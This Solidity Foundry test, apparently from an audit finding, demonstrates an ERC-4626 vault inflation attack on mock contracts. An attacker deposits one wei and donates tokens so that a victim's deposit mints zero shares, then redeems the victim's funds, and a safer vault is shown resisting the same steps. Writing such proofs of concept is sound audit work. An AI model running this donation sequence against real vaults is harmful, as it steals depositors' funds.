// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/OvaultMocks.sol";

contract LayerZeroOvaultM01Test is Test {
    function test_M01_overriddenConversionsMakeInflationAttackProfitable() public {
        MockToken token = new MockToken();
        VulnerableVault vulnerable = new VulnerableVault(token);
        SaferVault safer = new SaferVault(token);

        address attacker = address(0xA11CE);
        address victim = address(0xB0B);

        token.mint(attacker, 20_001 ether);
        token.mint(victim, 10_000 ether);

        vm.startPrank(attacker);
        vulnerable.deposit(1, attacker);
        vulnerable.donate(10_000 ether);
        vm.stopPrank();

        vm.startPrank(victim);
        uint256 victimSharesVuln = vulnerable.deposit(10_000 ether, victim);
        vm.stopPrank();

        assertEq(victimSharesVuln, 0, "victim should mint zero shares in vulnerable vault");

        vm.prank(attacker);
        uint256 assetsOut = vulnerable.redeem(1, attacker);
        assertGt(assetsOut, 10_000 ether, "attacker exits with donated + victim funds");

        token.mint(attacker, 20_001 ether);
        token.mint(victim, 10_000 ether);

        vm.startPrank(attacker);
        safer.deposit(1, attacker);
        token.transfer(address(safer), 10_000 ether);
        vm.stopPrank();

        vm.startPrank(victim);
        uint256 victimSharesSafe = safer.deposit(10_000 ether, victim);
        vm.stopPrank();

        assertGt(victimSharesSafe, 0, "safer math should avoid zero-share mint");
    }
}
